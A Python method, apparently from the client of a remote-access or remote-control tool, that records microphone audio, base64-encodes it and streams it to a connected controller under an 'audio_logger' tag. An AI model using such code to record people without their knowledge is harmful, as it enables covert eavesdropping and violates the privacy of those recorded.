import pyaudio
import base64
import traceback

def start_audio_stream(self):
    try:
        p = pyaudio.PyAudio()

        input_device_count = p.get_device_count()
        input_device_found = False
        for i in range(input_device_count):
            if p.get_device_info_by_index(i).get('maxInputChannels') > 0:
                input_device_found = True
                break

        if not input_device_found:
            self.send_message('response', self.converter.encode({"audio_logger": "From Client: No input device found"}))
            return

        stream = p.open(format=pyaudio.paInt16,
                        channels=1,
                        rate=44100,
                        input=True,
                        frames_per_buffer=1024)

        buffer = []
        buffer_size = 50

        while self.audio_handler and self.connected:
            try:
                audio_data = stream.read(1024)
                buffer.append(audio_data)

                if len(buffer) >= buffer_size:
                    audio_data_base64 = base64.b64encode(b''.join(buffer)).decode("utf-8")
                    self.send_message('response', self.converter.encode({"audio": audio_data_base64}))
                    buffer.clear()
            except:
                self.audio_handler = False
                self.send_message('response', self.converter.encode({"audio_logger": f"From Client: {traceback.format_exc()}"}))
                break

    except:
        self.audio_handler = False
        self.send_message('response', self.converter.encode({"audio_logger": f"From Client: {traceback.format_exc()}"}))

    finally:
        try:
            stream.stop_stream()
            stream.close()
            p.terminate()
        except:
            pass